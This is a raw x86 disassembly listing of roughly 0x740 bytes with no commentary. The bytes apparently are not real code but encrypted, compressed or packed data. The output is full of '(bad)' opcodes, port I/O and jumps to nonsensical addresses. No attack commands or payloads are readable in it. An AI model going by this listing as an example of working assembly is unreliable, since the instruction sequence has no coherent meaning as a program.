  41d4a4:	scas   eax,DWORD PTR es:[edi]
  41d4a5:	fcom   DWORD PTR [eax]
  41d4a7:	sub    ebx,DWORD PTR [eax+0x5975bafb]
  41d4ad:	pop    es
  41d4ae:	dec    esi
  41d4af:	repnz sahf 
  41d4b1:	push   ds
  41d4b2:	sbb    edx,ebx
  41d4b4:	cwde   
  41d4b5:	fwait
  41d4b6:	pop    edx
  41d4b7:	leave  
  41d4b8:	lahf   
  41d4b9:	xchg   ecx,eax
  41d4ba:	jle    0x41d4fe
  41d4bc:	and    BYTE PTR [edx+0xa6f1cd5],0xca
  41d4c3:	stc    
  41d4c4:	cwde   
  41d4c5:	(bad)  
  41d4c6:	cmp    DWORD PTR [eax+0x64],ecx
  41d4c9:	xor    ecx,esp
  41d4cb:	mov    bl,0x56
  41d4cd:	dec    ecx
  41d4ce:	jmp    0x41d4f1
  41d4d0:	add    ebp,ebp
  41d4d2:	push   0xe1e82767
  41d4d7:	xor    al,0x75
  41d4d9:	or     al,0xd2
  41d4db:	sar    BYTE PTR [ebp-0xa],0x9f
  41d4df:	adc    ah,BYTE PTR [eax]
  41d4e1:	lock in al,0x7d
  41d4e4:	mov    ebp,ebx
  41d4e6:	mov    DWORD PTR [ebp+0x1d],eax
  41d4e9:	xor    al,0xf6
  41d4eb:	icebp  
  41d4ec:	xchg   DWORD PTR [ecx],ebx
  41d4ee:	in     eax,0xab
  41d4f0:	pop    ebp
  41d4f1:	retf   
  41d4f2:	aam    0xd
  41d4f4:	inc    edi
  41d4f5:	int    0x85
  41d4f7:	adc    DWORD PTR [ecx],esp
  41d4f9:	sbb    BYTE PTR [edx],bl
  41d4fb:	push   edx
  41d4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4fd:	in     al,dx
  41d4fe:	mov    esi,0xafa670e0
  41d503:	mov    ebp,0xca7def54
  41d508:	push   ecx
  41d509:	xor    bh,BYTE PTR [ebp+esi*8+0x27]
  41d50d:	sub    ecx,DWORD PTR [ebp-0x76]
  41d510:	add    BYTE PTR [ebp+0x66],cl
  41d513:	fnsave [ebx-0x6b]
  41d516:	jno    0x41d51d
  41d518:	xchg   DWORD PTR gs:[esi+0xb],eax
  41d51c:	pop    ds
  41d51d:	xor    ah,BYTE PTR [edx+0x3c]
  41d520:	call   0x5c80b7bc
  41d525:	sub    BYTE PTR [edx-0x24443c0b],bl
  41d52b:	jb     0x41d535
  41d52d:	inc    DWORD PTR [bp+di-0x29]
  41d531:	clc    
  41d532:	or     eax,esi
  41d534:	mov    dh,BYTE PTR [esi-0x65e7e870]
  41d53a:	je     0x41d5b3
  41d53c:	nop
  41d53d:	mov    bl,0x41
  41d53f:	sahf   
  41d540:	mov    ds:0xbacbae14,al
  41d545:	in     eax,dx
  41d546:	test   al,0x52
  41d548:	add    dl,BYTE PTR [ebp+0x1dcb921d]
  41d54e:	pusha  
  41d54f:	sub    bh,BYTE PTR [ebp+0x9470368]
  41d555:	jl     0x41d543
  41d557:	ds cmp eax,0xc1583a16
  41d55d:	sub    dh,ch
  41d55f:	les    ebp,FWORD PTR [edi+ecx*1-0x6e4cd6d7]
  41d566:	(bad)  
  41d567:	fiadd  DWORD PTR [ebx-0x1a53dcad]
  41d56d:	loopne 0x41d568
  41d56f:	lahf   
  41d570:	(bad)  
  41d571:	jnp    0x41d54f
  41d573:	pushf  
  41d574:	lahf   
  41d575:	sub    esi,DWORD PTR [edx+0x38]
  41d578:	adc    dh,BYTE PTR [edi+0x1ed34724]
  41d57e:	add    dh,BYTE PTR [esp+ecx*2+0xef8d6ba]
  41d585:	retf   
  41d586:	pop    es
  41d587:	xor    dh,BYTE PTR [eax]
  41d589:	push   edi
  41d58a:	xor    ebx,ecx
  41d58c:	jmp    0x41d53e
  41d58e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d58f:	pop    edx
  41d590:	jl     0x41d5b1
  41d592:	adc    edi,0xffffff9d
  41d595:	fstp   DWORD PTR [esi-0x3a]
  41d598:	je     0x41d60d
  41d59a:	or     DWORD PTR [eax+0x69],ebx
  41d59d:	repnz and bl,dh
  41d5a0:	ja     0x41d52f
  41d5a2:	and    eax,0x7e5f1c3e
  41d5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5a8:	aaa    
  41d5a9:	pop    edi
  41d5aa:	leave  
  41d5ab:	outs   dx,DWORD PTR ds:[esi]
  41d5ac:	jno    0x41d542
  41d5ae:	jp     0x41d54c
  41d5b0:	push   edx
  41d5b1:	sbb    ah,BYTE PTR [eax-0x6cf2b8c2]
  41d5b7:	jno    0x41d5d2
  41d5b9:	mov    dl,0xc9
  41d5bb:	es pop ebp
  41d5bd:	cli    
  41d5be:	sbb    edi,DWORD PTR [edi+0xb]
  41d5c1:	or     eax,0x7be43a57
  41d5c6:	enter  0x2fd9,0x60
  41d5ca:	and    edi,ebp
  41d5cc:	inc    ecx
  41d5cd:	sbb    ebx,DWORD PTR [ebx-0x6b]
  41d5d0:	mov    bl,0x88
  41d5d2:	xor    DWORD PTR [ebp-0x63de36f4],edx
  41d5d8:	imul   DWORD PTR [eax]
  41d5da:	arpl   WORD PTR [edx-0xb],cx
  41d5dd:	pop    ebp
  41d5de:	fiadd  DWORD PTR [ecx-0x20]
  41d5e1:	std    
  41d5e2:	mov    dl,0x8a
  41d5e4:	fmul   st,st(4)
  41d5e6:	lahf   
  41d5e7:	out    0xaf,eax
  41d5e9:	int3   
  41d5ea:	mov    ds,WORD PTR [ecx-0x77427a18]
  41d5f0:	mov    ecx,0x8ccf4a8
  41d5f5:	and    al,0x6a
  41d5f7:	lahf   
  41d5f8:	mov    WORD PTR [esi+ebp*2-0x2e],fs
  41d5fc:	cmp    BYTE PTR [eax],dh
  41d5fe:	enter  0x6b3c,0xd6
  41d602:	add    bh,BYTE PTR ds:0x2a9eceb1
  41d608:	inc    ebp
  41d609:	and    BYTE PTR [edx+edx*4+0x41ea0662],cl
  41d610:	xor    ch,BYTE PTR [eax+0x29]
  41d613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d614:	int3   
  41d615:	mov    edi,0xca9bb5f5
  41d61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d61b:	aam    0x66
  41d61d:	sbb    eax,0xc2d03d88
  41d622:	stos   DWORD PTR es:[edi],eax
  41d623:	mov    esi,0x849acedb
  41d628:	pop    ecx
  41d629:	push   ebp
  41d62a:	mov    ebx,0x193f3375
  41d62f:	mov    dh,BYTE PTR [edx+0x274cd225]
  41d635:	pop    es
  41d636:	ins    BYTE PTR es:[edi],dx
  41d637:	fimul  DWORD PTR [ebp-0x9]
  41d63a:	jl     0x41d6a2
  41d63c:	jns    0x41d650
  41d63e:	in     eax,dx
  41d63f:	sbb    DWORD PTR [edx+0x1cfc7c50],edi
  41d645:	cld    
  41d646:	inc    ecx
  41d647:	(bad)  
  41d648:	jmp    0x41d621
  41d64a:	push   0x3c
  41d64c:	outs   dx,BYTE PTR ds:[esi]
  41d64d:	cmc    
  41d64e:	xor    BYTE PTR [ecx-0x31],ch
  41d651:	out    0xe4,al
  41d653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d654:	aam    0x8d
  41d656:	sbb    BYTE PTR [edx+0x1c],al
  41d659:	pop    ebp
  41d65a:	pop    ebx
  41d65b:	fsub   QWORD PTR [edi-0x46]
  41d65e:	mov    ebp,0xb7dca67c
  41d663:	or     ebx,ebp
  41d665:	adc    bl,BYTE PTR [edi]
  41d667:	ret    
  41d668:	leave  
  41d669:	fst    DWORD PTR [esi+0x3a3735bd]
  41d66f:	out    0x8c,eax
  41d671:	lods   al,BYTE PTR ds:[esi]
  41d672:	dec    ebp
  41d673:	jle    0x41d635
  41d675:	cmc    
  41d676:	xor    bh,BYTE PTR [edi]
  41d678:	pop    ds
  41d679:	sub    eax,0x4cfce5d0
  41d67e:	sub    eax,0xae53398e
  41d683:	ins    BYTE PTR es:[edi],dx
  41d684:	xor    eax,0x47244a7f
  41d689:	pop    edi
  41d68a:	push   ebx
  41d68b:	hlt    
  41d68c:	dec    edi
  41d68d:	xlat   BYTE PTR ds:[ebx]
  41d68e:	push   eax
  41d68f:	fwait
  41d690:	pop    ebx
  41d691:	es dec edx
  41d693:	cwde   
  41d694:	sbb    BYTE PTR [ebx-0x2],ah
  41d697:	or     DWORD PTR [esi+0x4943b8cf],ecx
  41d69d:	xchg   esp,eax
  41d69e:	cmp    eax,0xed30f570
  41d6a3:	cmp    bl,BYTE PTR ds:0x55200789
  41d6a9:	mov    ebp,0x11595bff
  41d6ae:	mov    BYTE PTR [edx+0x48c196a7],dh
  41d6b4:	xor    al,0x4e
  41d6b6:	in     al,0xe1
  41d6b8:	cmc    
  41d6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ba:	rcr    DWORD PTR [ebx+0x5af4e554],1
  41d6c0:	lods   al,BYTE PTR ds:[esi]
  41d6c1:	shr    BYTE PTR [ebx-0x728be303],cl
  41d6c7:	jg     0x41d727
  41d6c9:	or     dl,BYTE PTR [esi]
  41d6cb:	push   esp
  41d6cc:	mov    WORD PTR fs:[edi+esi*4-0x1059e783],es
  41d6d4:	add    DWORD PTR [edi],ebx
  41d6d6:	xor    al,0x4a
  41d6d8:	xchg   edi,eax
  41d6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6da:	(bad)  
  41d6db:	(bad)  
  41d6dc:	lods   eax,DWORD PTR ds:[esi]
  41d6dd:	dec    edx
  41d6de:	push   esi
  41d6df:	adc    ebx,edi
  41d6e1:	jne    0x41d715
  41d6e3:	fsub   DWORD PTR [eax]
  41d6e5:	mov    DWORD PTR [ebp-0xba1eb92],esp
  41d6eb:	or     DWORD PTR [ebx+edx*4+0x61c4b05b],ebx
  41d6f2:	enter  0x844e,0x60
  41d6f6:	inc    esi
  41d6f7:	test   eax,0x9447a19d
  41d6fc:	addr16 xchg ecx,eax
  41d6fe:	test   BYTE PTR [esp+eax*1-0x46],ch
  41d702:	dec    esp
  41d703:	dec    eax
  41d704:	loopne 0x41d6d0
  41d706:	jle    0x41d728
  41d708:	sbb    dl,BYTE PTR [ebx+0x36]
  41d70b:	jb     0x41d75a
  41d70d:	repnz bound edi,QWORD PTR [ecx+0x57]
  41d711:	sub    cl,BYTE PTR [edx]
  41d713:	rol    DWORD PTR [ecx],cl
  41d715:	retf   0xa324
  41d718:	cmp    DWORD PTR [ebx],eax
  41d71a:	jmp    0x41d776
  41d71c:	fwait
  41d71d:	addr16 push 0xffffffc1
  41d720:	fsubr  DWORD PTR [edx+0x22]
  41d723:	mov    ebp,0x3366a16
  41d728:	pop    eax
  41d729:	out    dx,al
  41d72a:	mov    ah,BYTE PTR [ecx-0x65]
  41d72d:	mov    esi,0xa65da5df
  41d732:	scas   al,BYTE PTR es:[edi]
  41d733:	mov    edx,DWORD PTR [ebp-0x6034eaf7]
  41d739:	dec    eax
  41d73a:	sbb    BYTE PTR [ebp+0x1058c392],ah
  41d740:	leave  
  41d741:	out    0x58,eax
  41d743:	jo     0x41d6f6
  41d745:	sub    al,0xf7
  41d747:	outs   dx,BYTE PTR ds:[esi]
  41d748:	data16 sub BYTE PTR [ebp+0x3981f06d],al
  41d74f:	pushf  
  41d750:	shr    BYTE PTR [edi-0x8],0x2
  41d754:	push   ecx
  41d755:	ins    DWORD PTR es:[edi],dx
  41d756:	pop    ebp
  41d757:	jbe    0x41d7c2
  41d759:	sbb    DWORD PTR [edi+0x3679311a],edi
  41d75f:	jmp    FWORD PTR [edx-0x5978092e]
  41d765:	ror    BYTE PTR [ebx],0xeb
  41d768:	inc    ecx
  41d769:	adc    eax,0x59740eb2
  41d76e:	fs inc edi
  41d770:	aaa    
  41d771:	mov    esp,0xc669f1e0
  41d776:	outs   dx,DWORD PTR ds:[esi]
  41d777:	and    BYTE PTR [eax],dh
  41d779:	movlps xmm3,QWORD PTR [edx+0xd]
  41d77d:	cmp    eax,0x9b0cdf06
  41d782:	hlt    
  41d783:	adc    al,0xd4
  41d785:	out    dx,al
  41d786:	or     eax,0x64cfa6eb
  41d78b:	mov    ah,0x3d
  41d78d:	fild   WORD PTR [ebp+0x6d2ee458]
  41d793:	ss xchg ebp,eax
  41d795:	add    esi,DWORD PTR [edi-0x59]
  41d798:	or     esp,edx
  41d79a:	mov    bl,0xb7
  41d79c:	out    0x9a,eax
  41d79e:	lods   eax,DWORD PTR ds:[esi]
  41d79f:	stos   DWORD PTR es:[edi],eax
  41d7a0:	push   cs
  41d7a1:	sbb    BYTE PTR [edx+0x29],cl
  41d7a4:	sub    esi,DWORD PTR [ebp+0x19]
  41d7a7:	push   esp
  41d7a8:	inc    esi
  41d7a9:	fidivr DWORD PTR [esi-0x2a]
  41d7ac:	aas    
  41d7ad:	(bad)  [esi-0x1ab55665]
  41d7b3:	loop   0x41d778
  41d7b5:	mov    WORD PTR [esi-0x77],cs
  41d7b8:	popf   
  41d7b9:	dec    ebx
  41d7ba:	es mov dh,0x7d
  41d7bd:	sub    BYTE PTR [esi-0x19a270b2],dh
  41d7c3:	mov    esp,0xa5a601a
  41d7c8:	js     0x41d74d
  41d7ca:	shr    ecx,1
  41d7cc:	arpl   dx,dx
  41d7ce:	sbb    ebx,ecx
  41d7d0:	mov    eax,ds:0x1697cea
  41d7d5:	pop    ds
  41d7d6:	outs   dx,BYTE PTR ds:[esi]
  41d7d7:	push   ss
  41d7d8:	cmp    esp,ebx
  41d7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7db:	mov    al,ds:0xfd7abce1
  41d7e0:	add    bh,BYTE PTR [edx+0x1bde5c49]
  41d7e6:	(bad)
  41d7ea:	ror    DWORD PTR [edi-0x16],1
  41d7ed:	jp     0x41d80d
  41d7ef:	dec    edi
  41d7f0:	or     BYTE PTR ds:0x72a337ee,cl
  41d7f6:	or     DWORD PTR [ebx+0x5b],0x7c17c587
  41d7fd:	ficomp DWORD PTR [esi-0x1303bb8e]
  41d803:	pop    ebp
  41d804:	sbb    bl,dl
  41d806:	sbb    al,0xc4
  41d808:	(bad)  
  41d80a:	mov    al,0x1c
  41d80c:	pop    eax
  41d80d:	outs   dx,BYTE PTR ds:[esi]
  41d80e:	cwde   
  41d80f:	imul   ebx,DWORD PTR [esi+esi*4-0x15c1c106],0xfe5b80ee
  41d81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d81b:	gs aam 0x3c
  41d81e:	dec    ebx
  41d81f:	lea    ecx,[eax+0x18]
  41d822:	shr    ecx,1
  41d824:	mov    ebp,0x5b14026b
  41d829:	jl     0x41d81a
  41d82b:	mov    dh,BYTE PTR [edx]
  41d82d:	sti    
  41d82e:	das    
  41d82f:	push   esp
  41d830:	enter  0x22a8,0x43
  41d834:	pop    ss
  41d835:	and    al,0x39
  41d837:	adc    esp,ecx
  41d839:	pop    es
  41d83a:	fdiv   QWORD PTR [edi]
  41d83c:	pop    edx
  41d83d:	and    DWORD PTR [esi-0x755845cb],ecx
  41d843:	aas    
  41d844:	sub    ebx,edi
  41d846:	out    0x15,al
  41d848:	jmp    0xfc12ef9e
  41d84d:	pop    ebx
  41d84e:	outs   dx,BYTE PTR ds:[esi]
  41d84f:	xlat   BYTE PTR ds:[ebx]
  41d850:	daa    
  41d851:	call   0xfc025ff7
  41d856:	push   ecx
  41d857:	cs cmp al,0xc7
  41d85a:	pop    ebp
  41d85b:	add    ch,BYTE PTR [ebx-0x54d13ab7]
  41d861:	popa   
  41d862:	sub    DWORD PTR [edi],esp
  41d864:	pop    ds
  41d865:	ja     0x41d8c4
  41d867:	adc    edx,DWORD PTR [ecx-0x43]
  41d86a:	mov    ecx,0x69d7016b
  41d86f:	bound  edi,QWORD PTR [eax-0x73b341c9]
  41d875:	push   0x2d
  41d877:	(bad)
  41d87a:	ret    0x1d7
  41d87d:	and    eax,0x76b996dc
  41d882:	ins    BYTE PTR es:[edi],dx
  41d883:	call   FWORD PTR [edx-0x7a]
  41d886:	mov    ds:0x587097e8,al
  41d88b:	fsub   QWORD PTR [edx-0x22a0be5a]
  41d892:	or     eax,0x78ce1184
  41d897:	mov    ah,ch
  41d899:	push   ecx
  41d89a:	out    dx,al
  41d89b:	retf   
  41d89c:	loopne 0x41d867
  41d89e:	ja     0x41d8a7
  41d8a0:	push   ds
  41d8a1:	data16 cli 
  41d8a3:	pop    es
  41d8a4:	sub    BYTE PTR [ecx],bl
  41d8a6:	fmul   QWORD PTR [eax-0x1b]
  41d8a9:	cmp    BYTE PTR [eax+0x1411a6f8],cl
  41d8af:	mov    ecx,0x8633c4bb
  41d8b4:	add    dh,cl
  41d8b6:	pop    es
  41d8b7:	jne    0x41d87c
  41d8b9:	cdq    
  41d8ba:	push   edi
  41d8bb:	in     eax,0xa6
  41d8bd:	(bad)  
  41d8be:	dec    ecx
  41d8bf:	or     DWORD PTR [edx],ecx
  41d8c1:	sub    DWORD PTR [ecx],edi
  41d8c3:	pop    ds
  41d8c4:	gs ins BYTE PTR es:[edi],dx
  41d8c6:	pop    ebx
  41d8c7:	mov    bl,0x87
  41d8c9:	xchg   ebp,eax
  41d8ca:	inc    ebp
  41d8cb:	lea    edi,[eax+0x3]
  41d8ce:	sbb    eax,0x1d87795b
  41d8d3:	xor    ebx,DWORD PTR [ebx-0x3e]
  41d8d6:	sbb    DWORD PTR [edi+0x49],edx
  41d8d9:	mov    eax,ds:0x5e48db88
  41d8de:	imul   edi,edi,0x68cde1fe
  41d8e4:	les    eax,FWORD PTR [ebx+0x29]
  41d8e7:	gs fcom st(5)
  41d8ea:	jge    0x41d911
  41d8ec:	stos   BYTE PTR es:[edi],al
  41d8ed:	pop    ebp
  41d8ee:	and    al,0x97
  41d8f0:	hlt    
  41d8f1:	or     BYTE PTR ss:[ebp+0x208aedce],bl
  41d8f8:	std    
  41d8f9:	pop    ebp
  41d8fa:	fwait
  41d8fb:	int3   
  41d8fc:	in     al,0xc1
  41d8fe:	cmp    bl,al
  41d900:	push   0x57
  41d902:	scas   al,BYTE PTR es:[edi]
  41d903:	mov    esp,0x644418fe
  41d908:	pop    ebp
  41d909:	mov    ds:0x84c97582,eax
  41d90e:	add    DWORD PTR [ecx-0x61],esi
  41d911:	rol    BYTE PTR [ebp+0x24845e4b],0x76
  41d918:	loop   0x41d954
  41d91a:	(bad)  
  41d91b:	pop    edx
  41d91c:	dec    ecx
  41d91d:	push   ds
  41d91e:	out    0x8,al
  41d920:	push   eax
  41d921:	out    dx,al
  41d922:	adc    esi,DWORD PTR [eax-0x45b0ba82]
  41d928:	xchg   edx,eax
  41d929:	fidiv  WORD PTR [ecx]
  41d92b:	xchg   esi,eax
  41d92c:	out    dx,eax
  41d92d:	rol    BYTE PTR [esi-0x9],0x88
  41d931:	aaa    
  41d932:	fadd   DWORD PTR [ebp-0x6074297e]
  41d938:	xor    BYTE PTR [ebx+0x79fbbc60],dl
  41d93e:	(bad)  
  41d93f:	xor    BYTE PTR [ebx],ch
  41d941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d942:	dec    ecx
  41d943:	sub    esp,ecx
  41d945:	add    DWORD PTR ss:[ecx],edi
  41d948:	push   eax
  41d949:	ficom  WORD PTR [eax]
  41d94b:	dec    edx
  41d94c:	xchg   esi,eax
  41d94d:	out    dx,eax
  41d94e:	sub    eax,0xb7b0ee7f
  41d953:	fwait
  41d954:	sub    ah,0x55
  41d957:	jae    0x41d8fc
  41d959:	jmp    0x317:0xfabf2f75
  41d960:	push   ebp
  41d961:	push   ebp
  41d962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d963:	(bad)  
  41d964:	(bad)  
  41d965:	mov    cl,0xc
  41d967:	ret    
  41d968:	ins    DWORD PTR es:[edi],dx
  41d969:	xchg   DWORD PTR gs:[edi],ecx
  41d96c:	imul   ecx,DWORD PTR [esi+0x52],0xffffff8b
  41d970:	fcomp  QWORD PTR [ebx+ebx*4]
  41d973:	or     eax,0x78d6178d
  41d978:	and    esi,ebp
  41d97a:	mov    esi,0xc621cb61
  41d97f:	or     eax,ecx
  41d981:	inc    edi
  41d982:	jno    0x41d9f3
  41d984:	jp     0x41d97e
  41d986:	test   bl,dh
  41d988:	aam    0x10
  41d98a:	xor    al,0xdc
  41d98c:	dec    esp
  41d98d:	push   ebp
  41d98e:	mov    ds:0xa276a65a,eax
  41d993:	mov    al,0xdf
  41d995:	sub    eax,0x19a4a9ac
  41d99a:	jno    0x41d9dc
  41d99c:	mov    WORD PTR [esi-0x61e0d0ee],ds
  41d9a2:	pop    ss
  41d9a3:	ins    BYTE PTR es:[edi],dx
  41d9a4:	rcr    DWORD PTR [edx+0x7c703a96],1
  41d9aa:	fwait
  41d9ab:	nop
  41d9ac:	xchg   DWORD PTR [edi+eiz*2+0x3fbfee4d],edx
  41d9b3:	pop    ecx
  41d9b4:	mov    edx,0x9c2e5ad5
  41d9b9:	arpl   WORD PTR [ebx+0x185ec34a],bx
  41d9bf:	repnz imul ebx,ebp,0x37b4adf4
  41d9c6:	(bad)  
  41d9c7:	out    dx,al
  41d9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9c9:	mov    ebx,0xfb37e2f0
  41d9ce:	jae    0x41da08
  41d9d0:	fsubr  DWORD PTR [ecx+0x7301106f]
  41d9d6:	inc    eax
  41d9d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9d8:	jae    0x41da04
  41d9da:	popf   
  41d9db:	mov    dl,0x4
  41d9dd:	test   eax,0x63e1574d
  41d9e2:	out    dx,eax
  41d9e3:	jg     0x41d9a4
  41d9e5:	aas    
  41d9e6:	hlt    
  41d9e7:	out    dx,eax
  41d9e8:	rcl    BYTE PTR [esi+0x4c],0x3c
  41d9ec:	add    esp,DWORD PTR [ecx]
  41d9ee:	xor    BYTE PTR [ecx+0x2d36d3f9],dh
  41d9f4:	in     al,0xf2
  41d9f6:	out    dx,eax
  41d9f7:	add    DWORD PTR [esi],0x5c
  41d9fa:	pop    esi
  41d9fb:	add    eax,0x432c18b3
  41da00:	mov    eax,0xc43128db
  41da05:	sub    bh,BYTE PTR [edx-0x6e]
  41da08:	data16 and dl,cl
  41da0b:	push   ecx
  41da0c:	and    eax,0xce83b6a0
  41da11:	or     BYTE PTR [esi],dh
  41da13:	push   edx
  41da14:	es stos BYTE PTR es:[edi],al
  41da16:	xchg   edi,eax
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	lods   eax,DWORD PTR ds:[esi]
  41da19:	(bad)  
  41da1a:	idiv   BYTE PTR [edx]
  41da1c:	lods   al,BYTE PTR ds:[esi]
  41da1d:	mov    dh,0x5a
  41da1f:	out    dx,eax
  41da20:	pusha  
  41da21:	pop    eax
  41da22:	out    0xd,eax
  41da24:	or     al,0x73
  41da26:	pop    ebp
  41da27:	mov    cl,0x9f
  41da29:	imul   eax,DWORD PTR [edi+0x1],0x866eba30
  41da30:	icebp  
  41da31:	cdq    
  41da32:	hlt    
  41da33:	out    0xd5,al
  41da35:	lods   eax,DWORD PTR ds:[esi]
  41da36:	and    eax,0x5712b5a2
  41da3b:	push   esp
  41da3c:	and    DWORD PTR [esi],ebx
  41da3e:	mov    DWORD PTR ds:0x22d9ce5b,esp
  41da44:	(bad)  
  41da45:	call   0x6a5007ad
  41da4a:	repz inc WORD PTR [edx+0x13ca5b9a]
  41da52:	test   BYTE PTR [ebp-0x62],ch
  41da55:	or     DWORD PTR [ebx+0x283607a8],ebp
  41da5b:	add    al,0x18
  41da5d:	or     al,0x1e
  41da5f:	ror    BYTE PTR [eax-0x71680ec2],cl
  41da65:	imul   esi,ebx,0xffffffab
  41da68:	cli    
  41da69:	add    bh,ch
  41da6b:	xchg   esp,eax
  41da6c:	mov    ah,0x9c
  41da6e:	jbe    0x41da77
  41da70:	test   eax,0x21aef717
  41da75:	mov    ecx,0xde5615d5
  41da7a:	push   edx
  41da7b:	push   ebp
  41da7c:	clc    
  41da7d:	nop
  41da7e:	lock aam 0x3
  41da81:	jo     0x41daa2
  41da83:	sub    DWORD PTR [ebx-0xf],0xef832ff7
  41da8a:	inc    ecx
  41da8b:	rcl    ecx,0x8
  41da8e:	jl     0x41da54
  41da90:	mov    edx,DWORD PTR [ecx]
  41da92:	inc    ebx
  41da93:	xor    DWORD PTR [esi+0x63ffd196],eax
  41da99:	shl    edi,cl
  41da9b:	adc    edx,DWORD PTR [esi-0x64]
  41da9e:	loop   0x41da82
  41daa0:	push   ecx
  41daa1:	pop    ss
  41daa2:	push   esp
  41daa3:	xor    bl,BYTE PTR [eax]
  41daa5:	enter  0xa64c,0xa
  41daa9:	call   0x47424d5a
  41daae:	mov    ch,dl
  41dab0:	xor    DWORD PTR [edi+0x6e],ecx
  41dab3:	xchg   DWORD PTR [ebx],edi
  41dab5:	test   eax,0xc78abfda
  41daba:	out    0x6c,eax
  41dabc:	mov    al,ds:0x5261d0c2
  41dac1:	xor    dh,dh
  41dac3:	sar    edx,0x7e
  41dac6:	jecxz  0x41db19
  41dac8:	mov    bl,ch
  41daca:	dec    edi
  41dacb:	xchg   ecx,eax
  41dacc:	sbb    eax,0x83d1f11e
  41dad1:	fwait
  41dad2:	mov    ds:0xa814605,eax
  41dad7:	add    eax,DWORD PTR [ecx-0x25]
  41dada:	inc    edx
  41dadb:	retf   
  41dadc:	add    DWORD PTR [ecx+ebp*8+0x5d],ebp
  41dae0:	add    BYTE PTR [eax],al
  41dae2:	add    BYTE PTR [eax],al
  41dae4:	add    BYTE PTR [eax],al
  41dae6:	retf   0xe76a
  41dae9:	ja     0x41dad2
  41daeb:	(bad)  
  41daec:	(bad)  
  41daee:	daa    
  41daef:	inc    ebx
  41daf0:	call   0xc2cabe6f
  41daf5:	mov    eax,DWORD PTR ds:0x220001d4
  41dafb:	pop    es
  41dafc:	add    BYTE PTR [eax],al
  41dafe:	cdq    
  41daff:	or     DWORD PTR [edi-0x5b],0xf9138e3a
  41db06:	faddp  st(1),st
  41db08:	ins    DWORD PTR es:[edi],dx
  41db09:	jne    0x8dc76402
  41db0f:	or     dl,BYTE PTR [edx+ecx*2]
  41db12:	cmp    DWORD PTR [eax],esp
  41db14:	xlat   BYTE PTR ds:[ebx]
  41db15:	push   edi
  41db16:	popa   
  41db17:	lock xlat BYTE PTR ds:[bx]
  41db1a:	xchg   ebp,eax
  41db1b:	and    edx,DWORD PTR [edi-0x24]
  41db1e:	mov    BYTE PTR [esi],dh
  41db20:	mov    dh,0x5b
  41db22:	aad    0x10
  41db24:	pop    ebp
  41db25:	mov    esi,0xf50d3d12
  41db2a:	daa    
  41db2b:	sti    
  41db2c:	dec    ebp
  41db2d:	sbb    BYTE PTR [eax-0x1a],ch
  41db30:	or     ebx,edi
  41db32:	int3   
  41db33:	out    0x7f,al
  41db35:	outs   dx,DWORD PTR ds:[esi]
  41db36:	pop    ebp
  41db37:	dec    ebx
  41db38:	rol    BYTE PTR [ebx-0x4b3f7683],1
  41db3e:	or     al,0x6b
  41db40:	fldenv [edx-0x6c]
  41db43:	xchg   esp,eax
  41db44:	popf   
  41db45:	repz and eax,DWORD PTR [esi+0x4b]
  41db49:	jne    0x41dae7
  41db4b:	seto   BYTE PTR [edi+eax*1-0x67]
  41db50:	retf   0x63e5
  41db53:	shr    DWORD PTR [edi],1
  41db55:	rcl    ch,0xf1
  41db58:	adc    eax,0x7cb0f626
  41db5d:	adc    bh,BYTE PTR [esi+eax*8-0x70]
  41db61:	test   al,0x6a
  41db63:	mov    dh,0x41
  41db65:	enter  0xa102,0x36
  41db69:	push   ds
  41db6a:	icebp  
  41db6b:	outs   dx,BYTE PTR ds:[esi]
  41db6c:	mov    esp,0x651383df
  41db71:	mov    BYTE PTR [ebx-0x61],0x2e
  41db75:	cmp    ebx,ecx
  41db77:	repnz out dx,al
  41db79:	call   0x2313909e
  41db7e:	fstp   DWORD PTR [ebx]
  41db80:	jecxz  0x41dbc3
  41db82:	imul   edx,DWORD PTR [ecx+0x3f],0xb0f1d6ca
  41db89:	cmp    al,0xa4
  41db8b:	mov    cl,0x91
  41db8d:	mov    ecx,DWORD PTR [ecx]
  41db8f:	sahf   
  41db90:	imul   DWORD PTR [edx-0x277307e9]
  41db96:	xchg   ebx,eax
  41db97:	lods   eax,DWORD PTR ds:[esi]
  41db98:	out    0x2d,eax
  41db9a:	ins    BYTE PTR es:[edi],dx
  41db9b:	sti    
  41db9c:	(bad)  
  41db9d:	call   0x11e6b945
  41dba2:	mov    ch,0x3c
  41dba4:	retf   0x518c
  41dba7:	jns    0x41db65
  41dba9:	xchg   ebx,eax
  41dbaa:	shr    edi,0x9f
  41dbad:	fnstenv [eax]
  41dbaf:	call   0x7a9e80a5
  41dbb4:	data16 js 0x41dc0c
  41dbb7:	pop    ds
  41dbb8:	adc    eax,DWORD PTR [esi-0x39]
  41dbbb:	scas   eax,DWORD PTR es:[edi]
  41dbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbbd:	dec    eax
  41dbbe:	jg     0x41db78
  41dbc0:	fidivr WORD PTR [ebx]
  41dbc2:	adc    ecx,ecx
  41dbc4:	adc    al,0xbc
  41dbc6:	push   es
  41dbc7:	sbb    BYTE PTR [esi],al
  41dbc9:	mov    ch,BYTE PTR [ebp+0x1e]
  41dbcc:	mov    bl,0xa
  41dbce:	pop    ebp
  41dbcf:	mov    ebx,0xf3ec6bd3
  41dbd4:	or     esp,0x650eedde
  41dbda:	and    bl,ah
  41dbdc:	pop    esi
  41dbdd:	push   es
  41dbde:	adc    DWORD PTR [esi+0x117f23bf],ebp
  41dbe4:	add    BYTE PTR [ecx-0x6e],ah
